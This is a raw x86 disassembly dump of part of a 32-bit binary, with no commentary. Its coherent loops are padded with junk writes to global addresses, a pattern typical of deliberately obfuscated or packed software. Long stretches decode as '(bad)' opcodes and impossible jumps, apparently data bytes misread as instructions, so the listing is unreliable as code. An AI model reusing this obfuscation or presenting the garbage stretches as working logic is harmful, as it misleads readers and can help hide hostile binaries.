  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	inc    edi
  40e415:	leave  
  40e416:	or     al,0xe0
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e44c
  40e421:	hlt    
  40e422:	pop    es
  40e423:	scas   eax,DWORD PTR es:[edi]
  40e424:	leave  
  40e425:	dec    edx
  40e426:	lods   eax,DWORD PTR ds:[esi]
  40e427:	adc    eax,0x9e9bb948
  40e42c:	dec    esp
  40e42d:	(bad)  
  40e42e:	jl     0x40e3e7
  40e430:	dec    ebx
  40e431:	cmp    ecx,DWORD PTR [ebx-0x1f7b337b]
  40e437:	repz dec esp
  40e439:	mov    DWORD PTR [esi],eax
  40e43b:	pop    eax
  40e43c:	dec    ebp
  40e43d:	xchg   ebp,eax
  40e43e:	pop    esp
  40e43f:	push   ebp
  40e440:	pop    esp
  40e441:	jbe    0x40e49a
  40e443:	fwait
  40e444:	xchg   ebp,eax
  40e445:	sbb    eax,esp
  40e447:	out    0x57,al
  40e449:	inc    esi
  40e44a:	inc    esi
  40e44b:	jne    0x40e4a0
  40e44d:	int3   
  40e44e:	cli    
  40e44f:	outs   dx,DWORD PTR ds:[esi]
  40e450:	inc    eax
  40e451:	sub    DWORD PTR [eax],0xffffffde
  40e454:	setbe  BYTE PTR [edi]
  40e457:	dec    edi
  40e458:	jmp    0x29eb8de0
  40e45d:	and    eax,0xd13ff412
  40e462:	stos   BYTE PTR es:[edi],al
  40e463:	mov    esi,0x6acf5d44
  40e468:	lods   al,BYTE PTR ds:[esi]
  40e469:	push   edi
  40e46a:	xchg   ebx,eax
  40e46b:	stos   BYTE PTR es:[edi],al
  40e46c:	pop    esp
  40e46d:	scas   al,BYTE PTR es:[edi]
  40e46e:	test   al,0x76
  40e470:	fsub   QWORD PTR [ecx-0x16]
  40e473:	push   ebx
  40e474:	mov    eax,esi
  40e476:	adc    bl,ah
  40e478:	push   edx
  40e479:	pop    ebx
  40e47a:	mov    ecx,0x3e1d1784
  40e47f:	and    eax,0xc5b9ffa0
  40e484:	inc    ecx
  40e485:	(bad)  
  40e486:	scas   eax,DWORD PTR es:[edi]
  40e487:	inc    esi
  40e488:	sbb    bh,BYTE PTR [esi]
  40e48a:	push   ds
  40e48b:	shr    DWORD PTR [ebx-0x54],0x7c
  40e48f:	icebp  
  40e490:	and    DWORD PTR [edx+ebp*8-0x44],ebp
  40e494:	je     0x40e42a
  40e496:	aaa    
  40e497:	icebp  
  40e498:	jecxz  0x40e427
  40e49a:	xor    DWORD PTR [ebp-0x8098fdf],0x6a737e80
  40e4a4:	leave  
  40e4a5:	(bad)
  40e4aa:	cs xchg edx,eax
  40e4ac:	mov    BYTE PTR [edx-0x32],ah
  40e4af:	mov    esi,0xe49be545
  40e4b4:	dec    ecx
  40e4b5:	cmp    BYTE PTR [ecx+0x7d],0xed
  40e4b9:	xlat   BYTE PTR ds:[ebx]
  40e4ba:	or     BYTE PTR [eax-0x5e],dh
  40e4bd:	cmp    edi,ecx
  40e4bf:	stos   DWORD PTR es:[edi],eax
  40e4c0:	retf   0x30a1
  40e4c3:	push   0x7c
  40e4c5:	shl    esi,0x5c
  40e4c8:	push   esp
  40e4c9:	add    BYTE PTR [eax+0x1e],bl
  40e4cc:	in     eax,dx
  40e4cd:	pop    eax
  40e4ce:	(bad)  
  40e4cf:	stos   DWORD PTR es:[edi],eax
  40e4d0:	jnp    0x40e4ca
  40e4d2:	cmp    BYTE PTR [ecx-0x65],0x6e
  40e4d6:	(bad)  
  40e4d7:	sti    
  40e4d8:	shl    DWORD PTR [ecx+0x2d],1
  40e4db:	mov    DWORD PTR [eax],ecx
  40e4dd:	mov    bl,0x62
  40e4df:	xchg   esp,eax
  40e4e0:	enter  0x1525,0xab
  40e4e4:	scas   al,BYTE PTR es:[edi]
  40e4e5:	nop
  40e4e6:	adc    al,0x92
  40e4e8:	jmp    0xf73e:0x6432d849
  40e4ef:	std    
  40e4f0:	cwde   
  40e4f1:	dec    ecx
  40e4f2:	ficomp WORD PTR [ebx-0x3a14a00e]
  40e4f8:	adc    eax,0x685182a1
  40e4fd:	(bad)  
  40e4fe:	mov    esi,0x393d5d2e
  40e503:	mov    BYTE PTR ds:0x3bd6b7a1,dh
  40e509:	outs   dx,DWORD PTR ds:[esi]
  40e50a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e50b:	lahf   
  40e50c:	and    BYTE PTR [edx],dl
  40e50e:	jl     0x40e563
  40e510:	retf   0x1865
  40e513:	push   eax
  40e514:	jne    0x40e546
  40e516:	sub    DWORD PTR [ecx-0x6c70b33b],edi
  40e51c:	iret   
  40e51d:	lods   al,BYTE PTR ds:[esi]
  40e51e:	push   esi
  40e51f:	outs   dx,BYTE PTR ds:[esi]
  40e520:	sti    
  40e521:	fisubr WORD PTR [ebx-0x1af5c49c]
  40e527:	xchg   DWORD PTR [esi],edx
  40e529:	mov    dh,0x86
  40e52b:	stos   DWORD PTR es:[di],eax
  40e52d:	pop    ds
  40e52e:	outs   dx,DWORD PTR ds:[esi]
  40e52f:	mov    dh,0xa5
  40e531:	daa    
  40e532:	mov    ebp,DWORD PTR [eax-0x3d]
  40e535:	jp     0x40e4fe
  40e537:	aaa    
  40e538:	sti    
  40e539:	xchg   ebp,eax
  40e53a:	loopne 0x40e4e1
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xc0f261b8
  40e5b4:	add    eax,0x992a6aa1
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5cd
  40e5c0:	(bad)  
  40e5c1:	xor    esp,ebx
  40e5c3:	les    ebx,FWORD PTR [ebp-0x6]
  40e5c6:	cld    
  40e5c7:	cmp    eax,0x6ef38853
  40e5cc:	call   0x585cb71f
  40e5d1:	xor    eax,0x37303fe3
  40e5d6:	push   ss
  40e5d7:	scas   eax,DWORD PTR es:[edi]
  40e5d8:	fisub  DWORD PTR [esi-0x13acb835]
  40e5de:	fsub   DWORD PTR [edi+0x33ccb722]
  40e5e4:	fsubr  DWORD PTR [edi+0x3882198]
  40e5ea:	add    esi,DWORD PTR [ebx-0x25a7b87e]
  40e5f0:	aad    0x9b
  40e5f2:	push   es
  40e5f3:	mov    al,0xa1
  40e5f5:	lahf   
  40e5f6:	push   ebp
  40e5f7:	xchg   edi,eax
  40e5f8:	push   cs
  40e5f9:	leave  
  40e5fa:	push   ebp
  40e5fb:	aam    0xe8
  40e5fd:	test   eax,0xd8d3d732
  40e602:	jns    0x40e58d
  40e604:	jns    0x40e60a
  40e606:	xor    BYTE PTR [ebp+ebx*4-0x1c12928e],ah
  40e60d:	data16 sub BYTE PTR [esi],bl
  40e610:	and    eax,0xe3b8f6bc
  40e615:	sub    DWORD PTR [ebx+0x1e],0x8d005b8
  40e61c:	je     0x40e5d5
  40e61e:	stos   BYTE PTR es:[edi],al
  40e61f:	jmp    0x40e666
  40e621:	cli    
  40e622:	aam    0x9b
  40e624:	sbb    al,0x27
  40e626:	push   es
  40e627:	push   edx
  40e628:	(bad)  
  40e629:	cli    
  40e62a:	mov    eax,DWORD PTR [edi]
  40e62c:	ret    0x3d5a
  40e62f:	out    0xe6,al
  40e631:	sub    ebx,edx
  40e633:	jno    0x40e646
  40e635:	jl     0x40e67a
  40e637:	xchg   ecx,eax
  40e638:	fs movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e63b:	sub    eax,0xd95e808b
  40e640:	add    al,ah
  40e642:	fcomp  DWORD PTR [ecx-0x18]
  40e645:	jne    0x40e62f
  40e647:	add    eax,0x34c1a1cd
  40e64c:	xchg   ebp,eax
  40e64d:	sub    al,0xf3
  40e64f:	cli    
  40e650:	pop    ss
  40e651:	js     0x40e610
  40e653:	xor    DWORD PTR [esi-0x5b44cdfd],0xb66f3c7c
  40e65d:	test   al,0x30
  40e65f:	stos   BYTE PTR es:[edi],al
  40e660:	jb     0x40e5ff
  40e662:	cld    
  40e663:	jo     0x40e639
  40e665:	popa   
  40e666:	sub    bl,cl
  40e668:	xchg   ebx,eax
  40e669:	adc    DWORD PTR [ebp+0x2c],eax
  40e66c:	(bad)  
  40e66d:	mov    ah,0x98
  40e66f:	sti    
  40e670:	aaa    
  40e671:	loop   0x40e61f
  40e673:	scas   eax,DWORD PTR es:[edi]
  40e674:	add    eax,0x8e8f71f8
  40e679:	mov    eax,0xc9d9359
  40e67e:	lahf   
  40e67f:	loopne 0x40e699
  40e681:	cmp    eax,0x3be60f53
  40e686:	fistp  WORD PTR [eax]
  40e688:	ret    
  40e689:	and    eax,0xc813c61f
  40e68e:	ss and al,0x88
  40e691:	fild   WORD PTR [edx-0x5]
  40e694:	test   BYTE PTR [edi],0x95
  40e697:	jmp    0x27aeae81
  40e69c:	out    0xfc,eax
  40e69e:	add    ebp,edi
  40e6a0:	ins    DWORD PTR es:[edi],dx
  40e6a1:	sub    eax,0x946018c1
  40e6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a7:	int3   
  40e6a8:	int3   
  40e6a9:	stos   BYTE PTR es:[edi],al
  40e6aa:	in     al,dx
  40e6ab:	mov    eax,0xab6ffd6f
  40e6b0:	loopne 0x40e636
  40e6b2:	mov    dl,0xf
  40e6b4:	aaa    
  40e6b5:	dec    ecx
  40e6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b7:	xchg   ch,al
  40e6b9:	sbb    eax,0xeae8652
  40e6be:	ss enter 0x498a,0x82
  40e6c3:	in     eax,0x2e
  40e6c5:	and    DWORD PTR [eax-0x39],eax
  40e6c8:	out    0x51,eax
  40e6ca:	and    bl,BYTE PTR [ebp+0x3]
  40e6cd:	ss mov ebx,0xa01c0c24
  40e6d3:	(bad)  
  40e6d4:	pop    ebx
  40e6d5:	daa    
  40e6d6:	push   es
  40e6d7:	mov    bl,0x90
  40e6d9:	mov    ebx,0x3b34a14d
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0xf29684]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e694
  40e704:	out    dx,al
  40e705:	fbstp  TBYTE PTR [edi]
  40e707:	mov    DWORD PTR [edx*1+0x4382c387],eax
  40e70e:	xor    al,dh
  40e710:	out    0x1d,al
  40e712:	or     ch,cl
  40e714:	jo     0x40e6b8
  40e716:	mov    al,BYTE PTR [esi]
  40e718:	arpl   WORD PTR [ecx],sp
  40e71a:	jp     0x40e727
  40e71c:	jns    0x40e6d7
  40e71e:	and    BYTE PTR [ecx-0x33],dl
  40e721:	xor    al,BYTE PTR [ebp-0x2]
  40e724:	ss jmp 0x526db217
  40e72a:	mov    ecx,0x1b50a78f
  40e72f:	jb     0x40e78a
  40e731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e732:	sbb    al,BYTE PTR [edx-0x21]
  40e735:	stc    
  40e736:	push   ecx
  40e737:	sub    cl,BYTE PTR [ebx-0x3874c032]
  40e73d:	rcr    BYTE PTR [edi-0x68],0x2d
  40e741:	out    0x5a,al
  40e743:	dec    edx
  40e744:	shl    bl,0x5b
  40e747:	(bad)  
  40e748:	adc    bl,BYTE PTR [ebx]
  40e74a:	sub    ah,0x73
  40e74d:	fld    QWORD PTR [edi+0x24]
  40e750:	mov    eax,ds:0xa129c6f5
  40e755:	sbb    al,0x5a
  40e757:	push   DWORD PTR [edx+0x486f1d5b]
  40e75d:	xchg   esi,eax
  40e75e:	jno    0x40e73e
  40e760:	je     0x40e798
  40e762:	shl    dl,1
  40e764:	rcl    BYTE PTR [edx-0x65849ba5],1
  40e76a:	test   cl,bh
  40e76c:	in     al,0x5b
  40e76e:	jp     0x40e7c2
  40e770:	and    ebp,eax
  40e772:	jmp    0xf989:0x7a146a0e
  40e779:	fisubr DWORD PTR [ecx-0x27ec0c59]
  40e77f:	inc    esi
  40e780:	ror    DWORD PTR [ebx+0x52],cl
  40e783:	mov    eax,0xed48eb4e
  40e788:	dec    eax
  40e789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78a:	mov    eax,eax
  40e78c:	or     ebx,0x64
  40e78f:	mov    cs,WORD PTR [edi-0x2f31d530]
  40e795:	inc    edi
  40e796:	inc    edi
  40e797:	idiv   BYTE PTR [edx+0x7529f930]
  40e79d:	push   ecx
  40e79e:	xlat   BYTE PTR ds:[ebx]
  40e79f:	or     eax,0xfff96603
  40e7a4:	inc    eax
  40e7a5:	popf   
  40e7a6:	ds mov edx,0x49bf8a07
  40e7ac:	mov    sp,0x5448
  40e7b0:	or     DWORD PTR [ebx+0x64],0x8
  40e7b4:	xor    al,BYTE PTR [ebx-0xbd90a2a]
  40e7ba:	inc    DWORD PTR [ebx-0x7d714a4e]
  40e7c0:	mov    eax,0x40402217
  40e7c5:	in     eax,0xf5
  40e7c7:	mov    edi,0x5d1cbf26
  40e7cc:	(bad)  
  40e7cd:	cmp    al,0x58
  40e7cf:	cmp    BYTE PTR [ecx],dh
  40e7d1:	out    dx,al
  40e7d2:	dec    edi
  40e7d3:	push   ebx
  40e7d4:	jp     0x40e810
  40e7d6:	push   ss
  40e7d7:	push   esp
  40e7d8:	in     eax,0xe7
  40e7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7db:	popa   
  40e7dc:	aam    0x6
  40e7de:	ds fs (bad) 
  40e7e1:	(bad)  [ebx+0x208a3303]
  40e7e7:	xchg   edx,eax
  40e7e8:	fadd   QWORD PTR [ebp-0x56]
  40e7eb:	lahf   
  40e7ec:	jmp    0x40e824
  40e7ee:	xchg   esp,eax
  40e7ef:	and    eax,0xa788fba2
  40e7f4:	mov    ecx,edx
  40e7f6:	jbe    0x40e809
  40e7f8:	xchg   esi,eax
  40e7f9:	adc    DWORD PTR [eax+0x358921aa],0xffffff88
  40e800:	mov    al,0xd
  40e802:	mov    ecx,0x8e56949d
  40e807:	jmp    0xd33b8d68
  40e80c:	sub    eax,0xff030f9
  40e811:	mov    BYTE PTR [edx-0x1aeae22e],bl
  40e817:	push   ds
  40e818:	pop    esp
  40e819:	sub    BYTE PTR [eax],cl
  40e81b:	cs dec edi
  40e81d:	xor    edx,edi
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8b3
  40e854:	inc    esi
  40e855:	xchg   ebp,eax
  40e856:	ja     0x40e83a
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e7ea
  40e860:	xor    esp,DWORD PTR [esi]
  40e862:	loopne 0x40e8b7
  40e864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e865:	call   0x4d633c3e
  40e86a:	adc    DWORD PTR [ecx],edx
  40e86c:	inc    eax
  40e86d:	and    edi,DWORD PTR [ebp+0x4cf99841]
  40e873:	xchg   ebp,eax
  40e874:	in     al,0xf8
  40e876:	pop    edx
  40e877:	ror    DWORD PTR [esi],cl
  40e879:	pop    ebp
  40e87a:	push   ss
  40e87b:	rol    esp,0x4f
  40e87e:	push   ecx
  40e87f:	je     0x40e80f
  40e881:	not    DWORD PTR [ebx+0x33]
  40e884:	mov    ebp,0x546f11cf
  40e889:	sub    ah,BYTE PTR [ebp+ecx*8+0x45f9ad6a]
  40e890:	cmp    esp,DWORD PTR [ebx+0x18]
  40e893:	sub    ah,dh
  40e895:	(bad)  
  40e896:	mov    ebp,edi
  40e898:	pop    ebx
  40e899:	arpl   WORD PTR [edx-0x51],sp
  40e89c:	int3   
  40e89d:	dec    esp
  40e89e:	out    0x79,al
  40e8a0:	addr16 out dx,al
  40e8a2:	(bad)  
  40e8a3:	and    eax,0x36f3e4d
  40e8a8:	rcl    esi,1
  40e8aa:	sahf   
  40e8ab:	dec    ecx
  40e8ac:	aas    
  40e8ad:	mov    ebx,0x9da68bd5
  40e8b2:	(bad)  
  40e8b4:	test   eax,0xc5ac0553
  40e8b9:	fidiv  DWORD PTR [ebx+0x373d0382]
  40e8bf:	push   esi
  40e8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c1:	inc    ebx
  40e8c2:	fwait
  40e8c3:	mov    gs,WORD PTR [ebx]
  40e8c5:	dec    esp
  40e8c6:	inc    ebp
  40e8c7:	mov    ebp,0x8058bf64
  40e8cc:	std    
  40e8cd:	inc    eax
  40e8ce:	popa   
  40e8cf:	sub    cl,BYTE PTR ds:0x32351120
  40e8d5:	dec    edi
  40e8d6:	stos   BYTE PTR es:[edi],al
  40e8d7:	in     al,0x98
  40e8d9:	in     al,dx
  40e8da:	stos   BYTE PTR es:[edi],al
  40e8db:	js     0x40e8b2
  40e8dd:	sub    ch,BYTE PTR [eax+edx*2]
  40e8e0:	cmp    ah,cl
  40e8e2:	aam    0x5d
  40e8e4:	les    esi,FWORD PTR [ecx+0x1fb57d8c]
  40e8ea:	adc    ebx,edi
  40e8ec:	cli    
  40e8ed:	cmp    eax,0x1bda9c16
  40e8f2:	mov    ch,0x51
  40e8f4:	jg     0x40e957
  40e8f6:	and    esp,DWORD PTR [ecx+0x3c]
  40e8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8fa:	scas   al,BYTE PTR es:[edi]
  40e8fb:	xchg   ecx,eax
  40e8fc:	add    eax,0xdd95c8d1
  40e901:	aad    0xdc
  40e903:	push   cs
  40e904:	xor    eax,0xc12b6159
  40e909:	push   edx
  40e90a:	leave  
  40e90b:	call   0xba21:0x43ab6aec
  40e912:	mov    cl,0x14
  40e914:	adc    BYTE PTR gs:[esi],al
  40e917:	jb     0x40e960
  40e919:	cmp    eax,0xd808b205
  40e91e:	dec    ebp
  40e91f:	or     BYTE PTR [eax+0xaf0c23c],bl
  40e925:	inc    ebp
  40e926:	call   0x55ca:0xc65b71a5
  40e92d:	(bad)  
  40e92e:	(bad)  [ebp-0x780c1f40]
  40e934:	loop   0x40e93d
  40e936:	out    0xcc,eax
  40e938:	sar    DWORD PTR [edi-0x306a20],0x59
  40e93f:	js     0x40e8ea
  40e941:	(bad)  
  40e942:	cs inc edx
  40e944:	push   eax
  40e945:	add    DWORD PTR [ecx-0x4e],ecx
  40e948:	and    eax,0x43633d8c
  40e94d:	inc    edi
  40e94e:	cmp    al,0x59
  40e950:	sbb    DWORD PTR [ebp-0x38921dfb],0xe79c71dd
  40e95a:	pop    esi
  40e95b:	in     al,0x2e
  40e95d:	int    0x30
  40e95f:	add    DWORD PTR [ebx+0x2258341b],eax
  40e965:	pushf  
  40e966:	add    eax,0x4d65d7f8
  40e96b:	jb     0x40e949
  40e96d:	mov    dl,0x10
  40e96f:	pop    eax
  40e970:	je     0x40e9e4
  40e972:	(bad)  
  40e973:	xchg   ebp,eax
  40e974:	shl    DWORD PTR [ebp-0x21b6fa75],0xd9
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x3ee5df1d
  40e99c:	adc    BYTE PTR [esi+0x127e7ea4],al
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e981
  40e9a6:	sub    al,0x25
  40e9a8:	(bad)  
  40e9aa:	outs   dx,DWORD PTR ds:[esi]
  40e9ab:	cmc    
  40e9ac:	mov    cl,0xc0
  40e9ae:	scas   eax,DWORD PTR es:[edi]
  40e9af:	dec    esi
  40e9b0:	pop    ds
  40e9b1:	arpl   bx,di
  40e9b3:	stc    
  40e9b4:	call   0x1203:0x2922bf09
  40e9bb:	mov    edx,0x33abe8d
  40e9c0:	test   eax,0x8ef930ad
  40e9c5:	mov    ecx,0x12562c55
  40e9ca:	mov    ds:0x18a9cc58,eax
  40e9cf:	clc    
  40e9d0:	leave  
  40e9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d2:	(bad)  
  40e9d3:	push   ss
  40e9d4:	push   edi
  40e9d5:	test   eax,0x8db5931f
  40e9da:	pusha  
  40e9db:	enter  0x84fd,0x72
  40e9df:	pop    ebx
  40e9e0:	sbb    al,0x7d
  40e9e2:	lahf   
  40e9e3:	jnp    0x40ea48
  40e9e5:	dec    eax
  40e9e6:	push   ebx
  40e9e7:	addr16 jge 0x40e97d
  40e9ea:	jmp    0x56dd:0xcff726b3
  40e9f1:	cmp    al,0xa0
  40e9f3:	sbb    al,ch
  40e9f5:	std    
  40e9f6:	int    0x22
  40e9f8:	sub    cl,cl
  40e9fa:	pop    eax
  40e9fb:	xor    BYTE PTR [edi],dl
  40e9fd:	and    al,0x4f
  40e9ff:	xor    BYTE PTR [edx+ebx*1-0x67a25746],dh
  40ea06:	iret   
  40ea07:	lods   al,BYTE PTR ds:[esi]
  40ea08:	mov    ds:0x88152096,al
  40ea0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea0e:	nop
  40ea0f:	adc    eax,0x8958a3f1
  40ea14:	ds es pop esi
  40ea17:	frstor [eax+0x6e2d321e]
  40ea1d:	in     eax,0xc2
  40ea1f:	adc    eax,0xf10748c2
  40ea24:	mov    dh,0xda
  40ea26:	cmp    ebp,DWORD PTR [esi+0x6e]
  40ea29:	mov    ds:0x140e4015,al
  40ea2e:	xchg   esi,eax
  40ea2f:	pushf  
  40ea30:	push   esp
  40ea31:	std    
  40ea32:	mov    bh,bl
  40ea34:	sub    bl,BYTE PTR cs:[eax+0xd]
  40ea38:	mov    al,0xe6
  40ea3a:	pop    eax
  40ea3b:	mul    DWORD PTR [ecx+0xf]
  40ea3e:	adc    BYTE PTR [ebp+0xe82086c],0x29
  40ea45:	push   ebp
  40ea46:	mov    dl,0x94
  40ea48:	jbe    0x40ea43
  40ea4a:	cdq    
  40ea4b:	retf   
  40ea4c:	inc    ebp
  40ea4d:	adc    DWORD PTR [edx-0x1b6199c2],edx
  40ea53:	ds scas eax,DWORD PTR es:[edi]
  40ea55:	xchg   edi,eax
  40ea56:	or     eax,0x9862ef44
  40ea5b:	retf   
  40ea5c:	les    ebp,FWORD PTR [esp+ebx*2-0x30]
  40ea60:	retf   
  40ea61:	adc    al,0xf9
  40ea63:	and    ah,BYTE PTR ss:[edi-0x5e4e7048]
  40ea6a:	and    eax,0x8a1e458d
  40ea6f:	mov    cl,0x9a
  40ea71:	in     eax,dx
  40ea72:	out    0xa9,al
  40ea74:	enter  0xf4e,0x23
  40ea78:	xchg   ebp,eax
  40ea79:	lea    ecx,[edx+ebp*8+0x219f9db]
  40ea80:	int    0x45
  40ea82:	imul   edx,DWORD PTR [esi+0x4f],0x409537c3
  40ea89:	cmc    
  40ea8a:	out    0x93,al
  40ea8c:	jae    0x40ea88
  40ea8e:	ins    DWORD PTR es:[edi],dx
  40ea8f:	xchg   ch,ah
  40ea91:	dec    eax
  40ea92:	scas   eax,DWORD PTR es:[edi]
  40ea93:	(bad)  
  40ea94:	adc    BYTE PTR [edx+0x70],bl
  40ea97:	and    DWORD PTR [edi],esi
  40ea99:	fadd   DWORD PTR [ecx]
  40ea9b:	aaa    
  40ea9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea9d:	pop    ebx
  40ea9e:	enter  0x8211,0xe8
  40eaa2:	outs   dx,DWORD PTR ds:[esi]
  40eaa3:	push   0xffffffc1
  40eaa5:	fadd   st,st(1)
  40eaa7:	mov    ebp,0x7b8d2f5f
  40eaac:	push   es
  40eaad:	neg    DWORD PTR [eax+edi*8+0x5727c02d]
  40eab4:	lods   al,BYTE PTR ds:[esi]
  40eab5:	jae    0x40ea56
  40eab7:	scas   al,BYTE PTR es:[edi]
  40eab8:	adc    ebp,DWORD PTR [ecx+0x72110757]
  40eabe:	pop    esi
  40eabf:	test   DWORD PTR [ebp-0x36a43cfd],ebx
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
